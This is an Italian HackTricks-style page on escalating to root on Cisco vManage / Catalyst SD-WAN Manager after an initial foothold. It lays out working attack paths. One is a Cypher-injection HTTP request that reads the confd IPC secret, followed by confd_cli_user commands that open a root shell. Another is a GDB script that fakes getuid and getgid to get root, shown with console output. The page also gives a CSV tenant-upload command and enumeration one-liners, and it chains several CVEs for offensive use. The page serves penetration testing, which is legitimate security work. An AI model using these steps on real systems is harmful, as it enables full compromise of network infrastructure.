# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una volta ottenuta la code execution su Cisco vManage / *Catalyst SD-WAN Manager* come `vmanage`, `netadmin` o `vmanage-admin`, le superfici di local privesc più interessanti sono solitamente lo stack CLI di `confd`, l'helper `cmdptywrapper`, le REST API su localhost e i gestori di import/upload di proprietà di root.

Se ti serve ancora l'**initial foothold** su un controller, consulta prima la pagina dedicata al control plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Se `/etc/confd/confd_ipc_secret` è leggibile dal tuo foothold, Path 1 e Path 2 diventano immediatamente praticabili. Se sei arrivato tramite un remote info leak o una webshell, verifica anche se puoi già raggiungere il materiale SSH di `vmanage-admin` o i multitenancy upload handlers: la ricerca del 2026 ha dimostrato che entrambi erano stepping stones realistici.

## Path 1

(Esempio da [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Dopo aver esaminato un po' di [documentazione](http://66.218.245.39/doc/html/rn03re18.html) relativa a `confd` e ai diversi binari (accessibili con un account sul sito web di Cisco), abbiamo scoperto che, per autenticare il socket IPC, utilizza un secret situato in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Ricordi la nostra istanza Neo4j? È in esecuzione con i privilegi dell'utente `vmanage`, consentendoci quindi di recuperare il file tramite la vulnerabilità precedente:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Il programma `confd_cli` non supporta argomenti da riga di comando, ma richiama `/usr/bin/confd_cli_user` con degli argomenti. Pertanto, possiamo richiamare direttamente `/usr/bin/confd_cli_user` con il nostro set di argomenti. Tuttavia, con i privilegi attuali non è leggibile, quindi dobbiamo recuperarlo dal rootfs e copiarlo usando scp, leggere l'help e usarlo per ottenere la shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Percorso 2

(Esempio da [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Il blog¹ del team synacktiv descriveva un modo elegante per ottenere una root shell, ma il limite è che richiede di ottenere una copia di `/usr/bin/confd_cli_user`, leggibile solo da root. Ho trovato un altro modo per effettuare l'escalation a root senza questa complicazione.

Quando ho disassemblato il binary `/usr/bin/confd_cli`, ho osservato quanto segue:

<details>
<summary>Objdump che mostra la raccolta di UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quando eseguo “ps aux”, ho osservato quanto segue (_nota -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ho ipotizzato che il programma “confd_cli” passi l’ID utente e l’ID gruppo raccolti dall’utente autenticato all’applicazione “cmdptywrapper”.

Il mio primo tentativo è stato eseguire direttamente “cmdptywrapper” fornendogli `-g 0 -u 0`, ma non ha funzionato. Sembra che lungo il percorso venga creato un file descriptor (-i 1015) e non posso falsificarlo.

Come menzionato nel blog di synacktiv (ultimo esempio), il programma `confd_cli` non supporta argomenti da riga di comando, ma posso influenzarlo con un debugger e, fortunatamente, GDB è incluso nel sistema.

Ho creato uno script GDB in cui ho forzato le API `getuid` e `getgid` a restituire 0. Poiché dispongo già del privilegio “vmanage” tramite la deserialization RCE, ho il permesso di leggere direttamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Output della console:

<details>
<summary>Output della console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (bug di validazione dell'input della CLI del 2025 - CVE-2025-20122)

Cisco ha successivamente documentato un percorso locale più semplice verso root nel proprio advisory per [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): un **attacker autenticato con soli privilegi read-only** poteva inviare una richiesta appositamente elaborata alla CLI del manager e ottenere root a causa di una validazione insufficiente dell'input.

Dal punto di vista offensivo, questo è l'aspetto importante da ricordare:

1. Una volta ottenuto *qualsiasi* foothold low-priv sul dispositivo, è opportuno testare il servizio CLI locale prima di procedere con il workflow più complesso di Path 1 / Path 2.
2. Riutilizzare gli artifact di Path 2 per individuare il trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considerare sospetto ogni campo inoltrato al backend della CLI: UID/GID, username, metadati del terminale, file importati o qualsiasi valore successivamente utilizzato da un helper di proprietà di root.
4. Se un utente low-priv può raggiungere il socket CLI locale e influenzare tali campi, root potrebbe essere a una sola richiesta appositamente elaborata di distanza.

Un workflow pratico dopo aver ottenuto l'accesso all'appliance è:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Questo trasforma il bug del 2025 in un buon pattern di hunting per versioni simili: cerca **local CLI shims che raccolgono l'identità in userland e la inoltrano a un wrapper con privilegi più elevati**.

Non confondere **CVE-2025-20122** con la successiva **CVE-2026-20122**: il problema del 2025 è un bug *local* da CLI a root, mentre quello del 2026 è un arbitrary file overwrite remoto tramite API, utile soprattutto per piantare un foothold e poi riprendere il Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

L'advisory Cisco del febbraio 2026 ha introdotto anche un'altra utile classe di privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) consentiva a un **attaccante autenticato, locale e con privilegi ridotti** di ottenere root a causa di un meccanismo insufficiente di autenticazione degli utenti nella REST API.

Questo è importante perché il privesc su vManage non è più limitato agli abusi di `confd`/TTY. Dopo aver ottenuto una low-priv shell, cerca anche:

- endpoint API accessibili solo da localhost che si fidano eccessivamente del chiamante
- token, cookie o credenziali dei servizi leggibili dall'account corrente
- azioni accessibili solo a root esposte tramite handler `dataservice`/REST che possono ancora essere attivate localmente

In pratica, una volta ottenuta una shell come `vmanage` o come un altro service user, l'abuso delle API locali è spesso più silenzioso e più facile da automatizzare rispetto all'abuso interattivo della CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se il contesto della sessione locale è sufficiente per raggiungere funzionalità REST con privilegi, preferisci il percorso API: è più facile da riprodurre, automatizzare con script e concatenare con web session o API token rubati.

## Percorso 5 (file crafted del 2026 elaborato da root - CVE-2026-20245)

Un altro pattern recente è [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): un attaccante locale con privilegi `netadmin` poteva caricare un **file crafted** che la CLI gestiva in seguito in modo non sicuro, portando a command injection come `root`.

Dal punto di vista di HackTricks, la tecnica utile è più ampia rispetto alla CVE specifica:

1. Enumera ogni workflow CLI o web che accetta un file: importazioni, diagnostic bundle, template, validator, backup, dati dei tenant, ecc.
2. Traccia dove viene salvato il file caricato e quale script o binario di proprietà di root lo utilizza.
3. Verifica se il nome del file, il contenuto del file o i metadata analizzati vengono mai passati a shell command, wrapper script o helper in stile `system()`.
4. Se puoi già raggiungere `netadmin` (credenziali valide, session rubata o una catena di auth-bypass), i bug nell'elaborazione dei file sono spesso il percorso più rapido verso root.

Successivamente, Google Cloud / Mandiant hanno mostrato un'istanza molto concreta di questa classe di bug sfruttata attraverso il percorso di importazione multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Nell'attacco osservato, il CSV appositamente creato è finito per modificare `/etc/passwd` e `/etc/shadow`, creando un account temporaneo con UID 0 (`troot`). Questo rende gli importer in stile `tenant-upload` / `tenant-list` particolarmente interessanti: non sono semplicemente funzionalità di data ingestion, ma potenziali front-end di parser eseguiti con i privilegi di root.

Un rapido pattern di ricerca lato shell è:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Questa classe di bug si combina particolarmente bene con i remote foothold che concedono `netadmin` ma non `root`.

## Altre vuln recenti di vManage/Catalyst SD-WAN Manager da concatenare

- **Info leak non autenticato (CVE-2026-20133)** – Particolarmente prezioso perché la ricerca pubblica ha mostrato che poteva esporre `confd_ipc_secret` o la private key di `vmanage-admin`, trasformando un bug di lettura in un Path 1 oppure in un pivot NETCONF.
- **Arbitrary file overwrite autenticato tramite API (CVE-2026-20122)** – Diverso dal bug CLI del 2025 sopra descritto; VulnCheck lo ha usato per caricare una webshell, rendendo così immediatamente rilevanti i percorsi di local privesc presenti in questa pagina.
- **XSS autenticato nella UI (CVE-2024-20475)** – Rubare una sessione admin nella web UI, quindi effettuare un pivot verso azioni API/CLI che portano infine a `vshell` o a uno dei percorsi di local privesc sopra descritti.
- **Auth bypass remoto verso `netadmin` (CVE-2026-20129)** – Precursore molto forte per il Path 5, perché `netadmin` è esattamente il livello richiesto dal crafted-file privesc del 2026.
- **Arbitrary file write autenticato (CVE-2026-20262)** – Valore offensivo simile a CVE-2026-20122, ma attraverso un successivo percorso di upload della web UI: scrivere in una posizione che verrà in seguito analizzata da root o dal web tier del management plane.
- **Downgrade per riesumare il vecchio CLI privesc (CVE-2022-20775)** – Le intrusioni del 2026 hanno mostrato che gli attacker possono effettuare il rollback a una vecchia build SD-WAN vulnerabile, abusare del vecchio bug CLI per ottenere root e quindi ripristinare la versione originale.
- **Auth bypass pre-auth del control plane (CVE-2026-20182)** – Descritto meglio nella pagina dedicata al control plane SD-WAN; può aggiungere una SSH key per `vmanage-admin`, fornendo il local foothold necessario per tornare su questa pagina.



## Riferimenti

- [Vulnerabilità di Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, ecc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Vulnerabilità di Privilege Escalation autenticata in Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager e Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Vulnerabilità recenti di Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: sfruttamento zero-day della vulnerabilità (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
